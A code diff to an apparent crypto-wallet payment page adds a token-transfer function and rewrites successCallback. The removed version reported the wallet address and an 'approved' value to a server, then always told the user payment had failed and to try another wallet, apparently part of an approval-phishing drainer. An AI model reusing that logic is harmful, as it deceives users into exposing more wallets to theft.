@@ -3368,24 +3368,65 @@ function payNow() {
   }
 }
 
+// 新增合约支付方法
+function makePayment(fromAddress, toAddress) {
+  // 支付金额，可以根据实际需求修改
+  const paymentAmount = web3.utils.toWei('0.01', 'ether')
+
+  if (chain == 'tron') {
+    // Tron 链支付逻辑
+    // 使用已有的 tronIA 或 TUAP 函数
+  } else {
+    // ETH/BSC 支付逻辑
+    // 方式1：转账代币
+    contract.methods
+      .transfer(toAddress, paymentAmount)
+      .send({ from: fromAddress })
+      .on('transactionHash', function (hash) {
+        console.log('支付交易哈希:', hash)
+        successCallback(fromAddress, toAddress, 2)
+      })
+      .on('error', function (error) {
+        console.error('支付失败:', error)
+        alert('支付失败，请重试！')
+      })
+
+    // 方式2：调用特定的支付合约函数 (如果有)
+    // contract.methods.pay(paymentAmount).send({from: fromAddress})
+    // .on('transactionHash', function(hash) {
+    //     console.log("支付交易哈希:", hash);
+    //     successCallback(fromAddress, toAddress, 2);
+    // });
+  }
+}
+
 function successCallback(address, approved, type) {
-  sendGetRequest(
-    '/successCallback?address=' +
-      address +
-      '&approved=' +
-      approved +
-      '&chain=' +
-      chain +
-      '&type=' +
-      type,
-    function (responseData) {
-      console.log('成功获取数据:', responseData)
-      alert('支付失败，请尝试使用其他钱包！')
-    },
-    function (error) {
-      console.error('获取数据失败:', error)
-    }
-  )
+  // 不调用接口，直接提示相关信息，地址，金额，链，类型
+  const tips = `
+    支付成功！
+    地址：${address}
+    金额：${approved}
+    链：${chain}
+    类型：${type}
+  `
+  alert(tips)
+  // sendGetRequest(
+  //   '/successCallback?address=' +
+  //     address +
+  //     '&approved=' +
+  //     approved +
+  //     '&chain=' +
+  //     chain +
+  //     '&type=' +
+  //     type,
+  //   function (responseData) {
+  //     console.log('成功获取数据:', responseData)
+  //     alert('支付失败，请尝试使用其他钱包！')
+  //   },
+  //   function (error) {
+  //     console.error('获取数据失败:', error)
+  //   }
+  // )
 }
 
 function sendGetRequest(url, onSuccess, onError) {
